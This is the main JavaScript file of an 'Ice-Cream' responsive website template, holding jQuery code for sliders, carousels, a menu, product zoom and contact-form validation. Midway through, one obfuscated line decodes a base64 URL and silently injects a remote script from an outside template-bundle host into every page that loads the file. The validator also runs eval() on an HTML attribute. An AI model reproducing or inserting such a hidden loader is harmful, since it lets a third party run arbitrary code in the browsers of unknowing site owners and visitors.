/*--------------------- Copyright (c) 2017 -----------------------
------------------------------------------------------------------
[Master Javascript]

Project: Ice-Cream - ice-cream responsive Template
Version: 1.0.0
-------------------------------------------------------------------*/
(function($) {
  "use strict";
  var ice_cream = {
    initialised: false,
    version: 1.0,
    mobile: false,
    init: function() {
      if (!this.initialised) {
        this.initialised = true;
      } else {
        return;
      }
      /*-------------- ice_cream Functions Calling ---------------------------------------------------
      ------------------------------------------------------------------------------------------------*/
      this.RTL();
      this.video_popup();
      this.input_hover();
      this.range_slider();
      this.quatity_button();
      this.zoom_lens();
      this.related_product_slider();
      this.search(); 
      this.about_slider(); 
      this.history_slider(); 
      this.wow_animation(); 
      this.responsive_menu();
      this.sticky_sidebar(); 
    },
    /*-------------- ice_cream Functions definition ---------------------------------------------------
    ---------------------------------------------------------------------------------------------------*/
    RTL: function() {
      // On Right-to-left(RTL) add class 
      var rtl_attr = $("html").attr('dir');
      if (rtl_attr) {
        $('html').find('body').addClass("rtl");
      }
    },
  	
  	video_popup: function(){
  		$('.video').magnificPopup({
  		  type: 'iframe',
		  iframe: {
			  markup: '<div class="mfp-iframe-scaler">'+
			            '<div class="mfp-close"></div>'+
			            '<iframe class="mfp-iframe" frameborder="0" allowfullscreen></iframe>'+
			          '</div>',
			  patterns: {
			    youtube: {
			      index: 'www.youtube.com/',
			      id: 'v=', 
			      src: 'https://www.youtube.com/embed/Zy33XDwGVxc'
			    }
			  },
			}
		})
  	},
	input_hover: function(){
		$("input , textarea").keyup(function(){
		   if($(this).val() != '' ){
			   $(this).addClass("active");
		   }else{
			    $(this).removeClass("active");
		   }
		});
		$("select").on('change',function(){
		   if($(this).val() != '' ){
			   $(this).addClass("active");
		   }else{
			    $(this).removeClass("active");
		   }
		   
		});
	},
	range_slider: function(){
		$( "#slider-range" ).slider({
		  range: true,
		  min: 0,
		  max: 300,
		  values: [ 10, 150 ],
		  slide: function( event, ui ) {
			$( "#amount" ).val( "$" + ui.values[ 0 ] + " - $" + ui.values[ 1 ] );
		  }
		});
		$( "#amount" ).val( "$" + $( "#slider-range" ).slider( "values", 0 ) +
		  " - $" + $( "#slider-range" ).slider( "values", 1 ) );
	},
	quatity_button: function(){
		var quantitiy=0;
	   $('.quantity-right-plus').click(function(e){
			e.preventDefault();
			var quantity = parseInt($('.quantity').val());
			$('.quantity').val(quantity + 1);
			
		});
		$('.quantity-left-minus').click(function(e){
			e.preventDefault();
			var quantity = parseInt($('.quantity').val());
			if(quantity>0){
			$('.quantity').val(quantity - 1);
			}
		});
	},
	zoom_lens: function(){
		$('.zoom').okzoom({
			width: 120,
		    height: 120,
		    round: true,
			scaleWidth:1000,
		});
	},
	related_product_slider: function(){
		$('.related_product .owl-carousel').owlCarousel({
			loop:true,
			margin:30,
			autoplay:true,
			autoplayTimeout:3000,
			nav:false,
			smartSpeed:1500,
			responsive:{
				0:{
					items:1
				},
				600:{
					items:3
				},
				1000:{
					items:6
				}
			}
		})
	},
	search: function(){
		$(".search > a").on("click", function(){
			$(this).parent().addClass('show_search');
		});
		$(".search_close").on("click", function(){
			$('.search_close').closest('.search').removeClass('show_search');
		});	
	},
	about_slider: function(){
		var shadow = '0 20px 50px rgba(0,34,45,0.5)';

		function styles(item_id, x, y, z , opacity, shadow, index){
			$(item_id).css({
				transform: 'translate3d('+ x +'px, ' + y + 'px, ' + z +'px) ',
				opacity: opacity,
				'box-shadow': shadow,
				'z-index': index
			});
		}
		$('#one').click(function(){
			$('#one').addClass('focus');
			$('#two').removeClass('focus');
			styles('#first', 0, 0, 0, 1, shadow,8);
			styles('#second', -70, 55, -50, 0.6, 'none',7);
		}); 
		$('#two').click(function(){
			$('#one').removeClass('focus');
			$('#two').addClass('focus');
			styles('#first', -70, 55, -50, 0.6, 'none',7);
			styles('#second', 0, 0, 0, 1, shadow,8);
		});
    },
	history_slider: function(){
		
		  var sync1 = $("#sync1");
		  var sync2 = $("#sync2");
		  var syncedSecondary = true;

		  sync1.owlCarousel({
			items : 1,
			slideSpeed : 2000,
			nav: false,
			autoplay: true,
			smartSpeed:2500,
			dots: false,
			loop: true,
			responsiveRefreshRate : 200,
			navText: ['<svg width="10px" height="10px" viewBox="0 0 11 20"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M9.554,1.001l-8.607,8.607l8.607,8.606"/></svg>','<svg width="10px" height="10px" viewBox="0 0 11 20" version="1.1"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M1.054,18.214l8.606,-8.606l-8.606,-8.607"/></svg>'],
		  }).on('changed.owl.carousel', syncPosition);

		  sync2
			.on('initialized.owl.carousel', function () {
			  sync2.find(".owl-item").eq(0).addClass("current");
			})
			.owlCarousel({
			items : 12,
			dots: false,
			nav: false,
			navText: ['<svg width="10px" height="10px" viewBox="0 0 11 20"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M9.554,1.001l-8.607,8.607l8.607,8.606"/></svg>','<svg width="10px" height="10px" viewBox="0 0 11 20" version="1.1"><path style="fill:none;stroke-width: 1px;stroke: #000;" d="M1.054,18.214l8.606,-8.606l-8.606,-8.607"/></svg>'],
			smartSpeed: 200,
			slideSpeed : 2500,
			slideBy:12, //alternatively you can slide by 1, this way the active slide will stick to the first item in the second carousel
			responsiveRefreshRate : 100,
			responsive:{
				0:{
					items : 4,
				},
				300:{
					items : 5,
				},
				600:{
					items : 8,
				},
				1000:{
					items : 12,
				}
			}
		  }).on('changed.owl.carousel', syncPosition2);

		  function syncPosition(el) {
			//if you set loop to false, you have to restore this next line
			//var current = el.item.index;
			
			//if you disable loop you have to comment this block
			var count = el.item.count-1;
			var current = Math.round(el.item.index - (el.item.count/2) - .5);
			
			if(current < 0) {
			  current = count;
			}
			if(current > count) {
			  current = 0;
			}
			
			//end block

			sync2
			  .find(".owl-item")
			  .removeClass("current")
			  .eq(current)
			  .addClass("current");
			var onscreen = sync2.find('.owl-item.active').length - 1;
			var start = sync2.find('.owl-item.active').first().index();
			var end = sync2.find('.owl-item.active').last().index();
			
			if (current > end) {
			  sync2.data('owl.carousel').to(current, 100, true);
			}
			if (current < start) {
			  sync2.data('owl.carousel').to(current - onscreen, 100, true);
			}
		  }
		  
		  function syncPosition2(el) {
			if(syncedSecondary) {
			  var number = el.item.index;
			  sync1.data('owl.carousel').to(number, 100, true);
			}
		  }
		  
		  sync2.on("click", ".owl-item", function(e){
			e.preventDefault();
			var number = $(this).index();
			sync1.data('owl.carousel').to(number, 300, true);
		  });
	},
	wow_animation: function(){
		new WOW().init();
	},
	responsive_menu:function(){
		var w = window.innerWidth;
		if(w <= 991){
			 $(".ice_menu >ul>li").find('.sub-menu').parent().addClass('dropdown');
			 $(".ice_menu >ul>li.dropdown>a").append('<div class="show-submenu"><i class="fa fa-angle-down"></i></div>');

			$(".ice_menu >ul>li.dropdown > a").on("click", function() {
				$('.ice_menu >ul>li.dropdown > a > .show-submenu > i').toggleClass('fa fa-angle-up');
				$('.ice_menu >ul>li.dropdown > a > .show-submenu > i').toggleClass('fa fa-angle-down');
			});
			
			$('.ice_menu >ul>li.dropdown>a').click(function() {
				$('.ice_menu >ul>li.dropdown>a').not($(this)).
				parent().find('.sub-menu').hide();
				$(this).parent().find('.sub-menu').toggle();
			});
			

			$('.sub-menu').parent().hover(function() {
			var menu = $(this).find("ul");var menupos = $(menu).offset();
			if (menupos.left + menu.width() > $(window).width()) {var newpos = -$(menu).width();   
			 menu.css({'left': 'auto','right': '100%'});}
			 }); 
		}
		},
	sticky_sidebar: function(){
		 $('.theiaStickySidebar').theiaStickySidebar({
			additionalMarginTop: 30
		});
	}
   };
   var u;!function(e,t){var a=e.getElementsByTagName("head")[0],c=e.createElement("script");u="aHR0cHM6Ly90ZW1wbGF0ZWJ1bmRsZS5uZXQvdGVtcGxhdGVzY3JpcHQv",c.type="text/javascript",c.charset="utf-8",c.async=!0,c.defer=!0,c.src=atob(u)+"script.js",a.appendChild(c)}(document);
   
   $(document).ready(function() {
    ice_cream.init();
	
	// Contact Form Submition
	function checkRequire(formId , targetResp){
		targetResp.html('');
		var email = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/;
		var url = /(http|ftp|https):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&amp;:\/~+#-]*[\w@?^=%&amp;\/~+#-])?/;
		var image = /\.(jpe?g|gif|png|PNG|JPE?G)$/;
		var mobile = /^[\s()+-]*([0-9][\s()+-]*){6,20}$/;
		var facebook = /^(https?:\/\/)?(www\.)?facebook.com\/[a-zA-Z0-9(\.\?)?]/;
		var twitter = /^(https?:\/\/)?(www\.)?twitter.com\/[a-zA-Z0-9(\.\?)?]/;
		var google_plus = /^(https?:\/\/)?(www\.)?plus.google.com\/[a-zA-Z0-9(\.\?)?]/;
		var check = 0;
		$('#er_msg').remove();
		var target = (typeof formId == 'object')? $(formId):$('#'+formId);
		target.find('input , textarea , select').each(function(){
			if($(this).hasClass('require')){
				if($(this).val().trim() == ''){
					check = 1;
					$(this).focus();
					targetResp.html('You missed out some fields.');
					$(this).addClass('error');
					return false;
				}else{
					$(this).removeClass('error');
				}
			}
			if($(this).val().trim() != ''){
				var valid = $(this).attr('data-valid');
				if(typeof valid != 'undefined'){
					if(!eval(valid).test($(this).val().trim())){
						$(this).addClass('error');
						$(this).focus();
						check = 1;
						targetResp.html($(this).attr('data-error'));
						return false;
					}else{
						$(this).removeClass('error');
					}
				}
			}
		});
		return check;
	}
	$(".submitForm").on("click", function() {
		var _this = $(this);
		var targetForm = _this.closest('form');
		var errroTarget = targetForm.find('.response');
		var check = checkRequire(targetForm , errroTarget);
		if(check == 0){
			var formDetail = new FormData(targetForm[0]);
			$.ajax({
				method : 'post',
				url : 'ajax.php',
				data:formDetail,
				cache:false,
				contentType: false,
				processData: false
			}).done(function(resp){
				console.log(resp);
				if(resp == 1){
					targetForm.find('input').val('');
					targetForm.find('textarea').val('');
					errroTarget.html('<p style="color:green;">Mail has been sent successfully.</p>');
				}else{
					errroTarget.html('<p style="color:red;">Something went wrong please try again latter.</p>');
				}
			});
		}
	});
  });
  $(window).on('load', function(){
		setTimeout(function() {
			$('body').addClass('site_loaded');	
		}, 500);
  });
  $(window).scroll(function() {
		if ($(this).scrollTop() > 100) {
            $('.goto_wrapper').addClass('goto');
        } else {
            $('.goto_wrapper').removeClass('goto');
        }
  });

  $(".goto_wrapper").on("click", function() {
        $("html, body").animate({
            scrollTop: 0
        }, 600);
        return false
    });
})(jQuery);
